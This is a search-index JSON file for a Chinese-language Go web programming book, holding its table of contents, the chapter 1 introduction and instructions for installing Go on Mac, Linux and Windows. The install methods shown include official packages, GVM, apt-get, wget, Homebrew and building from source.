{"config":{"lang":["ja"],"separator":"[\\s\\-\uff0c\u3002]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u76ee\u5f55","text":"<ul> <li> <p>1.Go\u73af\u5883\u914d\u7f6e</p> <ul> <li>1.1. \u5b89\u88c5Go</li> <li>1.2. GOPATH \u4e0e\u5de5\u4f5c\u7a7a\u95f4</li> <li>1.3. Go \u547d\u4ee4</li> <li>1.4. Go\u5f00\u53d1\u5de5\u5177</li> <li>1.5. \u5c0f\u7ed3</li> </ul> </li> <li> <p>2.Go\u8bed\u8a00\u57fa\u7840</p> <ul> <li>2.1. \u4f60\u597d\uff0cGo</li> <li>2.2. Go\u57fa\u7840</li> <li>2.3. \u6d41\u7a0b\u548c\u51fd\u6570</li> <li>2.4. struct</li> <li>2.5. \u9762\u5411\u5bf9\u8c61</li> <li>2.6. interface</li> <li>2.7. \u5e76\u53d1</li> <li>2.8. \u5c0f\u7ed3</li> </ul> </li> <li> <p>3.Web\u57fa\u7840</p> <ul> <li>3.1 web\u5de5\u4f5c\u65b9\u5f0f</li> <li>3.2 Go\u642d\u5efa\u4e00\u4e2a\u7b80\u5355\u7684web\u670d\u52a1</li> <li>3.3 Go\u5982\u4f55\u4f7f\u5f97web\u5de5\u4f5c</li> <li>3.4 Go\u7684http\u5305\u8be6\u89e3</li> <li>3.5 \u5c0f\u7ed3</li> </ul> </li> <li> <p>4.\u8868\u5355</p> <ul> <li>4.1 \u5904\u7406\u8868\u5355\u7684\u8f93\u5165</li> <li>4.2 \u9a8c\u8bc1\u8868\u5355\u7684\u8f93\u5165</li> <li>4.3 \u9884\u9632\u8de8\u7ad9\u811a\u672c</li> <li>4.4 \u9632\u6b62\u591a\u6b21\u9012\u4ea4\u8868\u5355</li> <li>4.5 \u5904\u7406\u6587\u4ef6\u4e0a\u4f20</li> <li>4.6 \u5c0f\u7ed3</li> </ul> </li> <li> <p>5.\u8bbf\u95ee\u6570\u636e\u5e93</p> <ul> <li>5.1 database/sql\u63a5\u53e3</li> <li>5.2 \u4f7f\u7528MySQL\u6570\u636e\u5e93</li> <li>5.3 \u4f7f\u7528SQLite\u6570\u636e\u5e93</li> <li>5.4 \u4f7f\u7528PostgreSQL\u6570\u636e\u5e93</li> <li>5.5 \u4f7f\u7528Beego orm\u5e93\u8fdb\u884cORM\u5f00\u53d1</li> <li>5.6 NOSQL\u6570\u636e\u5e93\u64cd\u4f5c</li> <li>5.7 \u5c0f\u7ed3</li> </ul> </li> <li> <p>6.session\u548c\u6570\u636e\u5b58\u50a8</p> <ul> <li>6.1 session\u548ccookie</li> <li>6.2 Go\u5982\u4f55\u4f7f\u7528session</li> <li>6.3 session\u5b58\u50a8</li> <li>6.4 \u9884\u9632session\u52ab\u6301 </li> <li>6.5 \u5c0f\u7ed3</li> </ul> </li> <li> <p>7.\u6587\u672c\u6587\u4ef6\u5904\u7406</p> <ul> <li>7.1 XML\u5904\u7406</li> <li>7.2 JSON\u5904\u7406 </li> <li>7.3 \u6b63\u5219\u5904\u7406</li> <li>7.4 \u6a21\u677f\u5904\u7406</li> <li>7.5 \u6587\u4ef6\u64cd\u4f5c</li> <li>7.6 \u5b57\u7b26\u4e32\u5904\u7406</li> <li>7.7 \u5c0f\u7ed3</li> </ul> </li> <li> <p>8.Web\u670d\u52a1</p> <ul> <li>8.1 Socket\u7f16\u7a0b</li> <li>8.2 WebSocket</li> <li>8.3 REST</li> <li>8.4 RPC</li> <li>8.5 \u5c0f\u7ed3</li> </ul> </li> <li> <p>9.\u5b89\u5168\u4e0e\u52a0\u5bc6</p> <ul> <li>9.1 \u9884\u9632CSRF\u653b\u51fb</li> <li>9.2 \u786e\u4fdd\u8f93\u5165\u8fc7\u6ee4</li> <li>9.3 \u907f\u514dXSS\u653b\u51fb</li> <li>9.4 \u907f\u514dSQL\u6ce8\u5165</li> <li>9.5 \u5b58\u50a8\u5bc6\u7801</li> <li>9.6 \u52a0\u5bc6\u548c\u89e3\u5bc6\u6570\u636e</li> <li>9.7 \u5c0f\u7ed3</li> </ul> </li> <li> <p>10.\u56fd\u9645\u5316\u548c\u672c\u5730\u5316 </p> <ul> <li>10.1 \u8bbe\u7f6e\u9ed8\u8ba4\u5730\u533a</li> <li>10.2 \u672c\u5730\u5316\u8d44\u6e90</li> <li>10.3 \u56fd\u9645\u5316\u7ad9\u70b9</li> <li>10.4 \u5c0f\u7ed3</li> </ul> </li> <li> <p>11.\u9519\u8bef\u5904\u7406\uff0c\u8c03\u8bd5\u548c\u6d4b\u8bd5</p> <ul> <li>11.1 \u9519\u8bef\u5904\u7406</li> <li>11.2 \u4f7f\u7528GDB\u8c03\u8bd5</li> <li>11.3 Go\u600e\u4e48\u5199\u6d4b\u8bd5\u7528\u4f8b</li> <li>11.4 \u5c0f\u7ed3</li> </ul> </li> <li> <p>12.\u90e8\u7f72\u4e0e\u7ef4\u62a4</p> <ul> <li>12.1 \u5e94\u7528\u65e5\u5fd7</li> <li>12.2 \u7f51\u7ad9\u9519\u8bef\u5904\u7406</li> <li>12.3 \u5e94\u7528\u90e8\u7f72</li> <li>12.4 \u5907\u4efd\u548c\u6062\u590d</li> <li>12.5 \u5c0f\u7ed3</li> </ul> </li> <li> <p>13.\u5982\u4f55\u8bbe\u8ba1\u4e00\u4e2aWeb\u6846\u67b6 </p> <ul> <li>13.1 \u9879\u76ee\u89c4\u5212 </li> <li>13.2 \u81ea\u5b9a\u4e49\u8def\u7531\u5668\u8bbe\u8ba1</li> <li>13.3 controller\u8bbe\u8ba1</li> <li>13.4 \u65e5\u5fd7\u548c\u914d\u7f6e\u8bbe\u8ba1</li> <li>13.5 \u5b9e\u73b0\u535a\u5ba2\u7684\u589e\u5220\u6539</li> <li>13.6 \u5c0f\u7ed3 </li> </ul> </li> <li> <p>14.\u6269\u5c55Web\u6846\u67b6</p> <ul> <li>14.1 \u9759\u6001\u6587\u4ef6\u652f\u6301</li> <li>14.2 Session\u652f\u6301</li> <li>14.3 \u8868\u5355\u652f\u6301</li> <li>14.4 \u7528\u6237\u8ba4\u8bc1</li> <li>14.5 \u591a\u8bed\u8a00\u652f\u6301</li> <li>14.6 pprof\u652f\u6301</li> <li>14.7 \u5c0f\u7ed3</li> </ul> </li> <li> <p>\u9644\u5f55A \u53c2\u8003\u8d44\u6599</p> </li> </ul>"},{"location":"01.0/","title":"1 GO\u73af\u5883\u914d\u7f6e","text":"<p>\u6b22\u8fce\u6765\u5230Go\u7684\u4e16\u754c\uff0c\u8ba9\u6211\u4eec\u5f00\u59cb\u63a2\u7d22\u5427\uff01</p> <p>Go\u662f\u4e00\u79cd\u65b0\u7684\u8bed\u8a00\uff0c\u4e00\u79cd\u5e76\u53d1\u7684\u3001\u5e26\u5783\u573e\u56de\u6536\u7684\u3001\u5feb\u901f\u7f16\u8bd1\u7684\u8bed\u8a00\u3002\u5b83\u5177\u6709\u4ee5\u4e0b\u7279\u70b9\uff1a</p> <ul> <li>\u5b83\u53ef\u4ee5\u5728\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\u7528\u51e0\u79d2\u949f\u7684\u65f6\u95f4\u7f16\u8bd1\u4e00\u4e2a\u5927\u578b\u7684Go\u7a0b\u5e8f\u3002</li> <li>Go\u4e3a\u8f6f\u4ef6\u6784\u9020\u63d0\u4f9b\u4e86\u4e00\u79cd\u6a21\u578b\uff0c\u5b83\u4f7f\u4f9d\u8d56\u5206\u6790\u66f4\u52a0\u5bb9\u6613\uff0c\u4e14\u907f\u514d\u4e86\u5927\u90e8\u5206C\u98ce\u683cinclude\u6587\u4ef6\u4e0e\u5e93\u7684\u5f00\u5934\u3002</li> <li>Go\u662f\u9759\u6001\u7c7b\u578b\u7684\u8bed\u8a00\uff0c\u5b83\u7684\u7c7b\u578b\u7cfb\u7edf\u6ca1\u6709\u5c42\u7ea7\u3002\u56e0\u6b64\u7528\u6237\u4e0d\u9700\u8981\u5728\u5b9a\u4e49\u7c7b\u578b\u4e4b\u95f4\u7684\u5173\u7cfb\u4e0a\u82b1\u8d39\u65f6\u95f4\uff0c\u8fd9\u6837\u611f\u89c9\u8d77\u6765\u6bd4\u5178\u578b\u7684\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\u66f4\u8f7b\u91cf\u7ea7\u3002</li> <li>Go\u5b8c\u5168\u662f\u5783\u573e\u56de\u6536\u578b\u7684\u8bed\u8a00\uff0c\u5e76\u4e3a\u5e76\u53d1\u6267\u884c\u4e0e\u901a\u4fe1\u63d0\u4f9b\u4e86\u57fa\u672c\u7684\u652f\u6301\u3002</li> <li>\u6309\u7167\u5176\u8bbe\u8ba1\uff0cGo\u6253\u7b97\u4e3a\u591a\u6838\u673a\u5668\u4e0a\u7cfb\u7edf\u8f6f\u4ef6\u7684\u6784\u9020\u63d0\u4f9b\u4e00\u79cd\u65b9\u6cd5\u3002</li> </ul> <p>Go\u662f\u4e00\u79cd\u7f16\u8bd1\u578b\u8bed\u8a00\uff0c\u5b83\u7ed3\u5408\u4e86\u89e3\u91ca\u578b\u8bed\u8a00\u7684\u6e38\u5203\u6709\u4f59\uff0c\u52a8\u6001\u7c7b\u578b\u8bed\u8a00\u7684\u5f00\u53d1\u6548\u7387\uff0c\u4ee5\u53ca\u9759\u6001\u7c7b\u578b\u7684\u5b89\u5168\u6027\u3002\u5b83\u4e5f\u6253\u7b97\u6210\u4e3a\u73b0\u4ee3\u7684\uff0c\u652f\u6301\u7f51\u7edc\u4e0e\u591a\u6838\u8ba1\u7b97\u7684\u8bed\u8a00\u3002\u8981\u6ee1\u8db3\u8fd9\u4e9b\u76ee\u6807\uff0c\u9700\u8981\u89e3\u51b3\u4e00\u4e9b\u8bed\u8a00\u4e0a\u7684\u95ee\u9898\uff1a\u4e00\u4e2a\u5bcc\u6709\u8868\u8fbe\u80fd\u529b\u4f46\u8f7b\u91cf\u7ea7\u7684\u7c7b\u578b\u7cfb\u7edf\uff0c\u5e76\u53d1\u4e0e\u5783\u573e\u56de\u6536\u673a\u5236\uff0c\u4e25\u683c\u7684\u4f9d\u8d56\u89c4\u8303\u7b49\u7b49\u3002\u8fd9\u4e9b\u65e0\u6cd5\u901a\u8fc7\u5e93\u6216\u5de5\u5177\u89e3\u51b3\u597d\uff0c\u56e0\u6b64Go\u4e5f\u5c31\u5e94\u8fd0\u800c\u751f\u4e86\u3002</p> <p>\u5728\u672c\u7ae0\u4e2d\uff0c\u6211\u4eec\u5c06\u8bb2\u8ff0Go\u7684\u5b89\u88c5\u65b9\u6cd5\uff0c\u4ee5\u53ca\u5982\u4f55\u914d\u7f6e\u9879\u76ee\u4fe1\u606f\u3002</p>"},{"location":"01.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"01.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0b\u4e00\u8282: \u5b89\u88c5Go</li> </ul>"},{"location":"01.1/","title":"1.1\u5b89\u88c5 Go","text":""},{"location":"01.1/#go","title":"Go\u7684\u4e09\u79cd\u5b89\u88c5\u65b9\u5f0f","text":"<p>Go\u6709\u591a\u79cd\u5b89\u88c5\u65b9\u5f0f\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9\u81ea\u5df1\u559c\u6b22\u7684\u3002\u8fd9\u91cc\u6211\u4eec\u4ecb\u7ecd\u4e09\u79cd\u6700\u5e38\u89c1\u7684\u5b89\u88c5\u65b9\u5f0f\uff1a</p> <ul> <li>Go\u6807\u51c6\u5305\u5b89\u88c5\uff1aGo\u63d0\u4f9b\u4e86\u65b9\u4fbf\u7684\u5b89\u88c5\u5305\uff0c\u652f\u6301Windows\u3001Linux\u3001Mac\u7b49\u7cfb\u7edf\u3002\u8fd9\u79cd\u65b9\u5f0f\u9002\u5408\u5feb\u901f\u5b89\u88c5\uff0c\u53ef\u6839\u636e\u81ea\u5df1\u7684\u7cfb\u7edf\u4f4d\u6570\u4e0b\u8f7d\u597d\u76f8\u5e94\u7684\u5b89\u88c5\u5305\uff0c\u4e00\u8def next \u5c31\u53ef\u4ee5\u8f7b\u677e\u5b89\u88c5\u4e86\u3002\u63a8\u8350\u8fd9\u79cd\u65b9\u5f0f</li> <li>\u7b2c\u4e09\u65b9\u5de5\u5177\u5b89\u88c5\uff1a\u76ee\u524d\u6709\u5f88\u591a\u65b9\u4fbf\u7684\u7b2c\u4e09\u65b9\u8f6f\u4ef6\u5305\u5de5\u5177\uff0c\u4f8b\u5982 Ubuntu \u7684 apt-ge t\u548c wget\u3001Mac \u7684 homebrew \u7b49\u3002\u8fd9\u79cd\u5b89\u88c5\u65b9\u5f0f\u9002\u5408\u90a3\u4e9b\u719f\u6089\u76f8\u5e94\u7cfb\u7edf\u7684\u7528\u6237\u3002</li> <li>Go\u6e90\u7801\u5b89\u88c5\uff1a\u8fd9\u662f\u4e00\u79cd\u6807\u51c6\u7684\u8f6f\u4ef6\u5b89\u88c5\u65b9\u5f0f\u3002\u5bf9\u4e8e\u7ecf\u5e38\u4f7f\u7528Unix\u7c7b\u7cfb\u7edf\u7684\u7528\u6237\uff0c\u5c24\u5176\u5bf9\u4e8e\u5f00\u53d1\u8005\u6765\u8bf4\uff0c\u4ece\u6e90\u7801\u5b89\u88c5\u53ef\u4ee5\u81ea\u5df1\u5b9a\u5236\u3002</li> </ul> <p>\u6700\u540e\uff0c\u5982\u679c\u4f60\u60f3\u5728\u540c\u4e00\u4e2a\u7cfb\u7edf\u4e2d\u5b89\u88c5\u591a\u4e2a\u7248\u672c\u7684Go\uff0c\u4f60\u53ef\u4ee5\u53c2\u8003\u7b2c\u4e09\u65b9\u5de5\u5177GVM\uff0c\u8fd9\u662f\u76ee\u524d\u5728\u8fd9\u65b9\u9762\u505a\u5f97\u6700\u597d\u7684\u5de5\u5177\uff0c\u9664\u975e\u4f60\u77e5\u9053\u600e\u4e48\u5904\u7406\u3002</p>"},{"location":"01.1/#go_1","title":"Go\u6807\u51c6\u5305\u5b89\u88c5","text":"<p>Go \u63d0\u4f9b\u4e86\u6bcf\u4e2a\u5e73\u53f0\u6253\u597d\u5305\u7684\u4e00\u952e\u5b89\u88c5\uff0c\u8fd9\u4e9b\u5305\u9ed8\u8ba4\u4f1a\u5b89\u88c5\u5230\u5982\u4e0b\u76ee\u5f55\uff1a/usr/local/go (Windows\u7cfb\u7edf\uff1ac:\\Go)\uff0c\u5f53\u7136\u4f60\u53ef\u4ee5\u6539\u53d8\u4ed6\u4eec\u7684\u5b89\u88c5\u4f4d\u7f6e\uff0c\u4f46\u662f\u6539\u53d8\u4e4b\u540e\u4f60\u5fc5\u987b\u5728\u4f60\u7684\u73af\u5883\u53d8\u91cf\u4e2d\u8bbe\u7f6e\u5982\u4e0b\u4fe1\u606f\uff1a</p> <pre><code>export GOROOT=$HOME/go  \nexport GOPATH=$HOME/gopath (\u53ef\u9009\u914d\u7f6e)\nexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin\n</code></pre> <p>\u4e0a\u9762\u8fd9\u4e9b\u547d\u4ee4\u5bf9\u4e8eMac\u548cUnix\u7528\u6237\u6765\u8bf4\u6700\u597d\u662f\u5199\u5165<code>.bashrc</code>\u6216\u8005<code>.zshrc</code>\u6587\u4ef6\uff0c\u5bf9\u4e8ewindows\u7528\u6237\u6765\u8bf4\u5f53\u7136\u662f\u5199\u5165\u73af\u5883\u53d8\u91cf\u3002  </p>"},{"location":"01.1/#3264-64","title":"\u5982\u4f55\u5224\u65ad\u81ea\u5df1\u7684\u64cd\u4f5c\u7cfb\u7edf\u662f32\u4f4d\u8fd8\u662f64\u4f4d\uff1f(\u5efa\u8bae\u76f4\u63a5\u8df3\u8fc7, \u73b0\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e00\u822c\u90fd\u662f 64\u4f4d)","text":"<p>\u6211\u4eec\u63a5\u4e0b\u6765\u7684Go\u5b89\u88c5\u9700\u8981\u5224\u65ad\u64cd\u4f5c\u7cfb\u7edf\u7684\u4f4d\u6570\uff0c\u6240\u4ee5\u8fd9\u5c0f\u8282\u6211\u4eec\u5148\u786e\u5b9a\u81ea\u5df1\u7684\u7cfb\u7edf\u7c7b\u578b\u3002</p> <p>Windows\u7cfb\u7edf\u7528\u6237\u8bf7\u6309Win+R\u8fd0\u884ccmd\uff0c\u8f93\u5165<code>systeminfo</code>\u540e\u56de\u8f66\uff0c\u7a0d\u7b49\u7247\u523b\uff0c\u4f1a\u51fa\u73b0\u4e00\u4e9b\u7cfb\u7edf\u4fe1\u606f\u3002\u5728\u201c\u7cfb\u7edf\u7c7b\u578b\u201d\u4e00\u884c\u4e2d\uff0c\u82e5\u663e\u793a\u201cx64-based PC\u201d\uff0c\u5373\u4e3a64\u4f4d\u7cfb\u7edf\uff1b\u82e5\u663e\u793a\u201cX86-based PC\u201d\uff0c\u5219\u4e3a32\u4f4d\u7cfb\u7edf\u3002</p> <p>Mac\u7cfb\u7edf\u7528\u6237\u5efa\u8bae\u76f4\u63a5\u4f7f\u752864\u4f4d\u7684\uff0c\u56e0\u4e3aGo\u6240\u652f\u6301\u7684Mac OS X\u7248\u672c\u5df2\u7ecf\u4e0d\u652f\u6301\u7eaf32\u4f4d\u5904\u7406\u5668\u4e86\u3002</p> <p>Linux\u7cfb\u7edf\u7528\u6237\u53ef\u901a\u8fc7\u5728Terminal\u4e2d\u6267\u884c\u547d\u4ee4<code>arch</code>(\u5373<code>uname -m</code>)\u6765\u67e5\u770b\u7cfb\u7edf\u4fe1\u606f\uff1a</p> <p>64\u4f4d\u7cfb\u7edf\u663e\u793a     x86_64</p> <p>32\u4f4d\u7cfb\u7edf\u663e\u793a     i386</p>"},{"location":"01.1/#mac","title":"Mac \u5b89\u88c5","text":"<p>\u8bbf\u95ee\u4e0b\u8f7d\u5730\u5740\uff0c64\u4f4d\u7cfb\u7edf\u4e0b\u8f7d go1.14.7.darwin-amd64.pkg\uff0c\u53cc\u51fb\u4e0b\u8f7d\u6587\u4ef6\uff0c\u4e00\u8def\u9ed8\u8ba4\u5b89\u88c5\u70b9\u51fb\u4e0b\u4e00\u6b65\uff0c\u8fd9\u4e2a\u65f6\u5019go\u5df2\u7ecf\u5b89\u88c5\u5230\u4f60\u7684\u7cfb\u7edf\u4e2d\uff0c\u9ed8\u8ba4\u5df2\u7ecf\u5728PATH\u4e2d\u589e\u52a0\u4e86\u76f8\u5e94\u7684<code>~/go/bin</code>, \u8fd9\u4e2a\u65f6\u5019\u6253\u5f00\u7ec8\u7aef\uff0c\u8f93\u5165<code>go</code> 32\u4f4d\u7cfb\u7edf\u4e0b\u8f7dgo1.4.2.darwin-386-osx10.8.pkg( \u65b0\u7684\u7248\u672c\u5df2\u65e032\u4f4d\u4e0b\u8f7d )</p> <p>\u770b\u5230\u7c7b\u4f3c\u4e0a\u9762\u6e90\u7801\u5b89\u88c5\u6210\u529f\u7684\u56fe\u7247\u8bf4\u660e\u5df2\u7ecf\u5b89\u88c5\u6210\u529f</p> <p>\u5982\u679c\u51fa\u73b0go\u7684Usage\u4fe1\u606f\uff0c\u90a3\u4e48\u8bf4\u660ego\u5df2\u7ecf\u5b89\u88c5\u6210\u529f\u4e86\uff1b\u5982\u679c\u51fa\u73b0\u8be5\u547d\u4ee4\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u53ef\u4ee5\u68c0\u67e5\u4e00\u4e0b\u81ea\u5df1\u7684PATH\u73af\u5883\u53d8\u4e2d\u662f\u5426\u5305\u542b\u4e86go\u7684\u5b89\u88c5\u76ee\u5f55\u3002</p>"},{"location":"01.1/#linux","title":"Linux \u5b89\u88c5","text":"<p>\u8bbf\u95ee\u4e0b\u8f7d\u5730\u5740\uff0c64\u4f4d\u7cfb\u7edf\u4e0b\u8f7dgo1.14.7.linux-amd64.tar.gz\uff0c32\u4f4d\u7cfb\u7edf\u4e0b\u8f7dgo1.14.7.linux-386.tar.gz\uff0c</p> <p>\u76f4\u63a5\u4f7f\u7528 <code>tar -C /usr/local -xzf go1.4.7.linux-amd64.tar.gz</code> \u89e3\u538b\u5230 local \u76ee\u5f55 \u8bbe\u7f6ePATH\uff0c<code>export PATH=$PATH:/usr/local/go/bin</code></p> <p>\u5047\u5b9a\u4f60\u60f3\u8981\u5b89\u88c5Go\u7684\u76ee\u5f55\u4e3a <code>$GO_INSTALL_DIR</code>\uff0c\u540e\u9762\u66ff\u6362\u4e3a\u76f8\u5e94\u7684\u76ee\u5f55\u8def\u5f84\u3002 \u89e3\u538b\u7f29<code>tar.gz</code>\u5305\u5230\u5b89\u88c5\u76ee\u5f55\u4e0b\uff1a<code>tar zxvf go1.14.7.linux-amd64.tar.gz -C $GO_INSTALL_DIR</code>\u3002</p> <p>\u8bbe\u7f6ePATH\uff0c<code>export PATH=$PATH:$GO_INSTALL_DIR/go/bin</code></p> <p>\u7136\u540e\u6267\u884c<code>go</code></p> <p></p> <p>\u56fe1.2 Linux\u7cfb\u7edf\u4e0b\u5b89\u88c5\u6210\u529f\u4e4b\u540e\u6267\u884cgo\u663e\u793a\u7684\u4fe1\u606f</p> <p>\u5982\u679c\u51fa\u73b0go\u7684Usage\u4fe1\u606f\uff0c\u90a3\u4e48\u8bf4\u660ego\u5df2\u7ecf\u5b89\u88c5\u6210\u529f\u4e86\uff1b\u5982\u679c\u51fa\u73b0\u8be5\u547d\u4ee4\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u53ef\u4ee5\u68c0\u67e5\u4e00\u4e0b\u81ea\u5df1\u7684PATH\u73af\u5883\u53d8\u4e2d\u662f\u5426\u5305\u542b\u4e86go\u7684\u5b89\u88c5\u76ee\u5f55\u3002</p>"},{"location":"01.1/#windows","title":"Windows \u5b89\u88c5","text":"<p>\u8bbf\u95eeGolang \u4e0b\u8f7d\u9875\uff0c64 \u4f4d\u8bf7\u9009\u62e9\u540d\u79f0\u4e2d\u5305\u542b windows-amd64 \u7684, 32 \u4f4d\u8bf7\u9009\u62e9\u540d\u79f0\u4e2d\u5305\u542b windows-386 \u7684 msi \u5b89\u88c5\u5305\u3002\u4e0b\u8f7d\u597d\u540e\u8fd0\u884c\uff0c\u4e0d\u8981\u4fee\u6539\u9ed8\u8ba4\u5b89\u88c5\u76ee\u5f55 C:\\Go\\\uff0c\u82e5\u5b89\u88c5\u5230\u5176\u4ed6\u4f4d\u7f6e\u4f1a\u5bfc\u81f4\u4e0d\u80fd\u6267\u884c\u81ea\u5df1\u6240\u7f16\u5199\u7684 Go \u4ee3\u7801\u3002\u5b89\u88c5\u5b8c\u6210\u540e\u9ed8\u8ba4\u4f1a\u5728\u73af\u5883\u53d8\u91cf Path \u540e\u6dfb\u52a0 Go \u5b89\u88c5\u76ee\u5f55\u4e0b\u7684 bin \u76ee\u5f55 <code>C:\\Go\\bin\\</code>\uff0c\u5e76\u6dfb\u52a0\u73af\u5883\u53d8\u91cf GOROOT\uff0c\u503c\u4e3a Go \u5b89\u88c5\u6839\u76ee\u5f55 <code>C:\\Go\\</code> \u3002</p> <p>\u9a8c\u8bc1\u662f\u5426\u5b89\u88c5\u6210\u529f</p> <p>\u5728\u8fd0\u884c\u4e2d\u8f93\u5165 <code>cmd</code> \u6253\u5f00\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5728\u63d0\u793a\u7b26\u4e0b\u8f93\u5165 <code>go</code>\uff0c\u68c0\u67e5\u662f\u5426\u80fd\u770b\u5230 Usage \u4fe1\u606f\u3002\u8f93\u5165 <code>cd %GOROOT%</code>\uff0c\u770b\u662f\u5426\u80fd\u8fdb\u5165 Go \u5b89\u88c5\u76ee\u5f55\u3002\u82e5\u90fd\u6210\u529f\uff0c\u8bf4\u660e\u5b89\u88c5\u6210\u529f\u3002</p> <p>\u4e0d\u80fd\u7684\u8bdd\u8bf7\u68c0\u67e5\u4e0a\u8ff0\u73af\u5883\u53d8\u91cf Path \u548c GOROOT \u7684\u503c\u3002\u82e5\u4e0d\u5b58\u5728\u8bf7\u5378\u8f7d\u540e\u91cd\u65b0\u5b89\u88c5\uff0c\u5b58\u5728\u8bf7\u91cd\u542f\u8ba1\u7b97\u673a\u540e\u91cd\u8bd5\u4ee5\u4e0a\u6b65\u9aa4\u3002</p>"},{"location":"01.1/#_1","title":"\u7b2c\u4e09\u65b9\u5de5\u5177\u5b89\u88c5","text":""},{"location":"01.1/#gvm","title":"GVM","text":"<p>gvm\u662f\u7b2c\u4e09\u65b9\u5f00\u53d1\u7684Go\u591a\u7248\u672c\u7ba1\u7406\u5de5\u5177\uff0c\u7c7b\u4f3cruby\u91cc\u9762\u7684rvm\u5de5\u5177\u3002\u4f7f\u7528\u8d77\u6765\u76f8\u5f53\u7684\u65b9\u4fbf\uff0c\u5b89\u88c5gvm\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff1a <pre><code>bash &lt; &lt;(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer)\n</code></pre> \u5b89\u88c5\u5b8c\u6210\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u5b89\u88c5go\u4e86\uff1a <pre><code>gvm install go1.14.7\ngvm use go1.14.7\n</code></pre> \u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u7701\u53bb\u6bcf\u6b21\u8c03\u7528gvm use\u7684\u9ebb\u70e6\uff1a         gvm use go1.14.7 --default</p> <p>\u6267\u884c\u5b8c\u4e0a\u9762\u7684\u547d\u4ee4\u4e4b\u540eGOPATH\u3001GOROOT\u7b49\u73af\u5883\u53d8\u91cf\u4f1a\u81ea\u52a8\u8bbe\u7f6e\u597d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u4e86\u3002</p>"},{"location":"01.1/#apt-get","title":"apt-get","text":"<p>Ubuntu\u662f\u76ee\u524d\u4f7f\u7528\u6700\u591a\u7684Linux\u684c\u9762\u7cfb\u7edf\uff0c\u4f7f\u7528<code>apt-get</code>\u547d\u4ee4\u6765\u7ba1\u7406\u8f6f\u4ef6\u5305\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u6765\u5b89\u88c5Go\uff0c\u4e3a\u4e86\u4ee5\u540e\u65b9\u4fbf\uff0c\u5e94\u8be5\u628a <code>git</code> <code>mercurial</code> \u4e5f\u5b89\u88c5\u4e0a\uff1a <pre><code>sudo apt-get install python-software-properties\nsudo add-apt-repository ppa:gophers/go\nsudo apt-get update\nsudo apt-get install golang-stable git-core mercurial\n</code></pre></p>"},{"location":"01.1/#wget","title":"wget","text":"<pre><code>wget https://storage.googleapis.com/golang/go1.14.7.linux-amd64.tar.gz\n\u6216 wget https://dl.google.com/go/go1.14.7.linux-amd64.tar.gz\n\nsudo tar -xzf go1.14.7.linux-amd64.tar.gz -C /usr/local </code></pre> <p>\u914d\u7f6e\u73af\u5883\u53d8\u91cf: <pre><code>export GOROOT=/usr/local/go\nexport GOBIN=$GOROOT/bin\nexport PATH=$PATH:$GOBIN\nexport GOPATH=$HOME/gopath (\u53ef\u9009\u8bbe\u7f6e)\n</code></pre> \u6216\u8005\u4f7f\u7528:  <pre><code>sudo vim /etc/profile </code></pre> \u5e76\u6dfb\u52a0\u4e0b\u9762\u7684\u5185\u5bb9\uff1a <pre><code>export GOROOT=/usr/local/go\nexport GOBIN=$GOROOT/bin\nexport PATH=$PATH:$GOBIN\nexport GOPATH=$HOME/gopath (\u53ef\u9009\u8bbe\u7f6e)\n</code></pre></p> <p>\u91cd\u65b0\u52a0\u8f7d profile \u6587\u4ef6 <pre><code>source /etc/profile </code></pre></p>"},{"location":"01.1/#homebrew","title":"homebrew","text":"<p>homebrew\u662fMac\u7cfb\u7edf\u4e0b\u9762\u76ee\u524d\u4f7f\u7528\u6700\u591a\u7684\u7ba1\u7406\u8f6f\u4ef6\u7684\u5de5\u5177\uff0c\u76ee\u524d\u5df2\u652f\u6301Go\uff0c\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u76f4\u63a5\u5b89\u88c5Go\uff0c\u4e3a\u4e86\u4ee5\u540e\u65b9\u4fbf\uff0c\u5e94\u8be5\u628a <code>git</code> <code>mercurial</code> \u4e5f\u5b89\u88c5\u4e0a\uff1a</p> <p>1.\u5b89\u88c5homebrew</p> <pre><code>/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n</code></pre> <p>2.\u5b89\u88c5go</p> <pre><code>brew update &amp;&amp; brew upgrade\nbrew install go\nbrew install git\nbrew install mercurial // \u53ef\u9009\u5b89\u88c5\n</code></pre>"},{"location":"01.1/#go_2","title":"Go\u6e90\u7801\u5b89\u88c5","text":"<p>Go 1.5\u5f7b\u5e95\u79fb\u9664 C \u4ee3\u7801\uff0cRuntime\u3001Compiler\u3001Linker\u5747\u7531Go\u7f16\u5199,\u5b9e\u73b0\u81ea\u4e3e\u3002\u53ea\u9700\u8981\u5b89\u88c5\u4e86\u4e0a\u4e00\u4e2a\u7248\u672c,\u5373\u53ef\u4ece\u6e90\u7801\u5b89\u88c5\u3002</p> <p>\u5728Go 1.5\u524d,Go\u7684\u6e90\u4ee3\u7801\u4e2d\uff0c\u6709\u4e9b\u90e8\u5206\u662f\u7528Plan 9 C\u548cAT&amp;T\u6c47\u7f16\u5199\u7684\uff0c\u56e0\u6b64\u5047\u5982\u4f60\u8981\u60f3\u4ece\u6e90\u7801\u5b89\u88c5\uff0c\u5c31\u5fc5\u987b\u5b89\u88c5C\u7684\u7f16\u8bd1\u5de5\u5177\u3002</p> 